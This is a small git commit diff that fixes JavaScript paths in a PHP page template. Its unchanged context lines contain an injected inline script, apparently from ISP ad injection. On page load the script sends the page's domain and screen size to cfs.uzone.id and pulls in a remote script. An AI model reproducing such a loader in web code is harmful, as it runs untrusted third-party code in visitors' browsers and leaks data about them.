dbed6c43d5e15a7bfcb5c427fe3133a479d5e9e2
Andre Christoga <andrechristoga@gmail.com>
2016-04-06 23:16:51 +0700

    Fix js path

--- src/post.php
+++ src/post.php
@@ -93,9 +93,9 @@
   <!-- /.container -->
 
     <!-- jQuery (necessary for Flat UI's JavaScript plugins) -->
-    <script src="js/vendor/jquery.min.js"></script>
+    <script src="../js/vendor/jquery.min.js"></script>
     <!-- Include all compiled plugins (below), or include individual files as needed -->
-    <script src="js/flat-ui.min.js"></script>
+    <script src="../js/flat-ui.min.js"></script>
 
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpn4r0dea1NvXLPmJ5XRtqgzCLYO2812KEWbSvjw9pewSArhWQLbUqr1xBjuhKpcSQGGjQuAfi8aNZ2Qe4Fmx5v8PK%2bDrgne9xVs3%2fnkkFvYx21Okwy%2b04FtV9cHflFh5YKh%2beqbXGmr8ffo%2bxmqwtnMJb7MId61su%2fN0aqOhV0mdajxc7GI0kuWCjcGuJsWI7fR5P1f8vONRY5fzDSX0xOqTqKo3GClbmPlx9%2fIz9vrjOo7e61F3WE2ChwHJoz9brW%2fzVvn%2fzkl3VkNAJhkjEFRF%2bFuU9bxqHfyX%2fVqwCsqYEac9MAvrWi%2b%2fOvTz97DAyzlEbbsrpzrmHhZtF%2byJfzc%2bvSQ1U%2fRWhh4BB8ES3NZILEPuW%2fgGVgJeImg%2b%2fJjS8hwskgR7WH%2bwFyDLxfI60SglytAKlH9xqNcjFeQNPYCAa8kDjpXK%2fpydJRc0qto4fsaygo2pzAZP1%2bSAQbyD2O%2fFvpnceZWpt2rHtV%2bf35ysaHmdc%2fRhqlwTVqqCcCFgLUWI47ZmLCoOa0F1p3Oy567nCMum2SPmIAorzbER426hI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>
